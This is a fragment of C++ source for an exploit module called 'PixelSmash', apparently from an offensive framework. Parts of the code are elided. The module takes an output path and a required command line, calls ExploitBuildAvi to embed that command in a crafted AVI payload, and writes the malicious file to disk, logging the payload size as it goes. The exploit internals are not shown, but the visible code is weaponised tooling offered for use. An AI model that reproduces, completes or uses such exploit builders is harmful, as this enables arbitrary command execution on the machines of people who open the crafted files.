...
public:
    PixelSmash()
    {
        RegisterOption("FilePath", std::make_unique<OptString>(
            ...
            ""));
		RegisterOption("CmdLine", std::make_unique<OptString>(
			"", OptionRequired::Required,
    ...
    bool Run() override
    {
        ...
        Color::PrintInfo() << "PixelSmash: building payload for output file " << FilePath << std::endl;
        Color::PrintInfo() << "PixelSmash: command length = " << CommandLine.size() << std::endl;
        ...
        if (ExploitBuildAvi(&Cal, CommandLine.c_str(), 1, &PayloadBuffer, &PayloadSize) != 0 ||
            !PayloadBuffer || PayloadSize == 0) {
            Color::PrintBad() << "PixelSmash: failed to build AVI payload." << std::endl;
            return false;
        }
        Color::PrintInfo() << "PixelSmash: payload size = " << PayloadSize << " bytes" << std::endl;
		FILE* Fp = fopen(FilePath.c_str(), "wb");
        if (!Fp) {
            Color::PrintBad() << "PixelSmash: failed to open output file." << std::endl;
            free(PayloadBuffer);
            return false;
        }
		...
		fclose(Fp);
		free(PayloadBuffer);
        Color::PrintInfo() << "PixelSmash: wrote " << Written << " bytes." << std::endl;
